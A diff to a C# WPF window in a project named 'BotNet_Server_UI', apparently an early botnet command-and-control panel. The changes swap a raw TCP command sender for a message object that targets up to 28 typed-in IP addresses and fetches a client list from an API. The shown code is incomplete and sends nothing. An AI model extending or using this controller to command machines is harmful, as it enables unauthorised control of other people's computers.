@@ -2,6 +2,8 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Net;
+using System.Net.Http;
+using System.Net.Http.Headers;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
@@ -22,97 +24,29 @@ namespace BotNet_Server_UI
     /// </summary>
     public partial class MainWindow : Window
     {
+        static uint messageid = 0;
+        List<TextBox> textBoxes = new List<TextBox>();
         public MainWindow()
         {
             InitializeComponent();
         }
         private async void Connect_Click(object sender, RoutedEventArgs e)
         {
-#pragma warning disable CS0618 // Тип или член устарел
-            IPHostEntry ipHostInfo = Dns.Resolve(Dns.GetHostName());
-#pragma warning restore CS0618 // Тип или член устарел
-            IPAddress ipAddress = ipHostInfo.AddressList[0];
-            IPEndPoint ipPoint = new IPEndPoint(ipAddress, 8005);
 
-            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
-            {
-                try
-                {
-                    socket.Bind(ipPoint);
-
-                    socket.Listen(10);
-                    ServerLabel.Content = "Сервер запущен по адресу: " + ipAddress.ToString() + ":8005";
-                    await Task.Run(async () =>
-                    {
-                        while (true)
-                        {
-                            Socket handler = socket.Accept();
-                            StringBuilder builder = new StringBuilder();
-                            int bytes = 0;
-                            byte[] data = new byte[256];
-
-                            do
-                            {
-                                bytes = handler.Receive(data);
-                                builder.Append(Encoding.Unicode.GetString(data, 0, bytes));
-                            }
-                            while (handler.Available > 0);
-                            Action action = () =>
-                            {
-                                LogPanel.Text += DateTime.Now.ToShortTimeString() + ": " + builder.ToString() + "\n";
-                            };
-                            await LogPanel.Dispatcher.BeginInvoke(action);
-                        }
-                    });
-                }
-                catch (Exception ex)
-                {
-                    MessageBox.Show(ex.Message);
-                }
-            }
         }
 
         private async void Send_Command()
         {
-
-            if (IP.Text == "" || Command.Text == "")
+            Message message = new Message()
             {
-                MessageBox.Show("(2) Убедитесь что вы ввели все значения");
-                return;
-            }
-
-            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
+                id = messageid++,
+                command = Command.Text,
+                ip = new string[Convert.ToInt32(IPCount.Content.ToString())]
+            };
+            for (int i = 0; i < message.ip.Length; i++)
             {
-                try
-                {
-                    socket.Connect(IPAddress.Parse(IP.Text), 8005);
-                    string message = Command.Text;
-                    byte[] data = Encoding.Unicode.GetBytes(message);
-                    socket.Send(data);
-
-                    data = new byte[256];
-                    StringBuilder builder = new StringBuilder();
-                    int bytes = 0;
-
-                    do
-                    {
-                        bytes = socket.Receive(data, data.Length, 0);
-                        builder.Append(Encoding.Unicode.GetString(data, 0, bytes));
-                    }
-                    while (socket.Available > 0);
-                    Action action = () =>
-                    {
-                        LogPanel.Text += DateTime.Now.ToShortTimeString() + ": " + builder.ToString() + "\n";
-                    };
-                    await LogPanel.Dispatcher.BeginInvoke(action);
-                }
-                catch (Exception ex)
-                {
-                    MessageBox.Show(ex.Message);
-                }
+                message.ip[i] = textBoxes[i].Text;
             }
-
-            Command.Text = "";
         }
 
         private void Button_Click(object sender, RoutedEventArgs e)
@@ -127,5 +61,77 @@ namespace BotNet_Server_UI
                 Send_Command();
             }
         }
+
+        private async void Formloaded(object sender, RoutedEventArgs e)
+        {
+            textBoxes.Add(IP1);
+            textBoxes.Add(IP2);
+            textBoxes.Add(IP3);
+            textBoxes.Add(IP4);
+            textBoxes.Add(IP5);
+            textBoxes.Add(IP6);
+            textBoxes.Add(IP7);
+            textBoxes.Add(IP8);
+            textBoxes.Add(IP9);
+            textBoxes.Add(IP10);
+            textBoxes.Add(IP11);
+            textBoxes.Add(IP12);
+            textBoxes.Add(IP13);
+            textBoxes.Add(IP14);
+            textBoxes.Add(IP15);
+            textBoxes.Add(IP16);
+            textBoxes.Add(IP17);
+            textBoxes.Add(IP18);
+            textBoxes.Add(IP19);
+            textBoxes.Add(IP20);
+            textBoxes.Add(IP21);
+            textBoxes.Add(IP22);
+            textBoxes.Add(IP23);
+            textBoxes.Add(IP24);
+            textBoxes.Add(IP25);
+            textBoxes.Add(IP26);
+            textBoxes.Add(IP27);
+            textBoxes.Add(IP28);
+            UpdateTextBoxes();
+            ClientList.Text = (await ApiRequest.GetProductAsync<IP>("/api/v1/ip")); /*.ip.ToString();*/
+        }
+
+        private void Minus_Click(object sender, RoutedEventArgs e)
+        {
+            if (Convert.ToInt32(IPCount.Content.ToString()) == 1)
+            {
+                MessageBox.Show("Значение не может быть ниже 1 и выше 28");
+                return;
+            }
+            IPCount.Content = Convert.ToInt32(IPCount.Content.ToString()) - 1;
+            UpdateTextBoxes();
+        }
+
+        private void Plus_Click(object sender, RoutedEventArgs e)
+        {
+            if (Convert.ToInt32(IPCount.Content.ToString()) == 28)
+            {
+                MessageBox.Show("Значение не может быть ниже 1 и выше 28");
+                return;
+            }
+            IPCount.Content = Convert.ToInt32(IPCount.Content.ToString()) + 1;
+            UpdateTextBoxes();
+        }
+
+        private void UpdateTextBoxes()
+        {
+            for (int i = 0; i < textBoxes.Count; i++)
+            {
+                if (i < Convert.ToInt32(IPCount.Content.ToString()))
+                {
+                    textBoxes[i].Visibility = Visibility.Visible;
+                }
+                else
+                {
+                    textBoxes[i].Visibility = Visibility.Hidden;
+                }
+            }
+        }
+
     }
 }
